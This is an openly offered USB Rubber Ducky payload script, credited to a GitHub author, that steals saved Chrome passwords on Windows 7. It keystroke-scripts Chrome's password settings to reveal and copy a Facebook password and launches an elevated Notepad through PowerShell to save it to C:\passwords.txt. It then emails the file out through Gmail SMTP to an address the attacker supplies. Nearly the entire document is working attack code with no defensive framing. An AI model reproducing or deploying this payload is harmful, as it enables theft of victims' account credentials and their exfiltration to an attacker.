Steals Chrome passwords in the blink of an eye.
Credits: This payload was created by nuk3leus (https://github.com/Nuk3leus/Ducky-chrome-password-stealer)

EDIT: Google Chrome Version 36.0.1985.143 and below: Any version above is patched and requires user password.

```
REM Author: Nuk3leus
REM Ducky chrome password stealer: 1.0
REM Target: Windows 7
REM Description: Opens chrome, navigates to chrome settings, navigates to saved passwords, searches for facebook, shows password, copys password
REM closes chrome, Opens notepad with bypass uac so it can save to C:\ drive and pastes in password 
REM saves to C:\passwords.txt folder, closes notepad
REM sends files via gmail to account.
DELAY 2000
REM -------------open chrome
GUI r
DELAY 1000
STRING chrome
DELAY 1000
ENTER
DELAY 4000
REM -------------copy plaintext password
STRING chrome://settings/passwords
ENTER
DELAY 2000
STRING facebook
DELAY 500
TAB
DELAY 500
DOWN
DELAY 500
TAB
DELAY 500
TAB
DELAY 500
ENTER
DELAY 500
ALT D
DELAY 500
TAB
DELAY 500
TAB
DELAY 500
TAB
DELAY 500
CTRL C
DELAY 500
ALT F4
DELAY 500
REM -------------save file to music folder as passwords.txt
GUI R
DELAY 500
STRING powershell start-process notepad.exe -Verb runAs
DELAY 500 
ENTER
DELAY 2000
ALT y
DELAY 1000
CTRL V
DELAY 500
ALT f
DELAY 500
STRING s
DELAY 500
STRING passwords.txt
DELAY 500
TAB
TAB
TAB
TAB
TAB
TAB
TAB
TAB
TAB
STRING c
DELAY 1000
STRING l
DELAY 500
ENTER
DELAY 500
ALT S
DELAY 1000
ALT F4
DELAY 500
REM -------------email log via gmail
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 1000
STRING $SMTPServer = 'smtp.gmail.com'
ENTER
STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
ENTER
STRING $SMTPInfo.EnableSsl = $true
ENTER
STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('youremail@gmail.com', 'password');
ENTER
STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
ENTER
STRING $ReportEmail.From = 'youremail@gmail.com'
ENTER
STRING $ReportEmail.To.Add('toemail@gmail.com')
ENTER
STRING $ReportEmail.Subject = 'Ducky chrome passwords'
ENTER
STRING $ReportEmail.Body = 'Attached is your list of passwords.' 
ENTER
STRING $ReportEmail.Attachments.Add('c:\passwords.txt')
ENTER
STRING $SMTPInfo.Send($ReportEmail)
ENTER
DELAY 3000
STRING exit
ENTER
```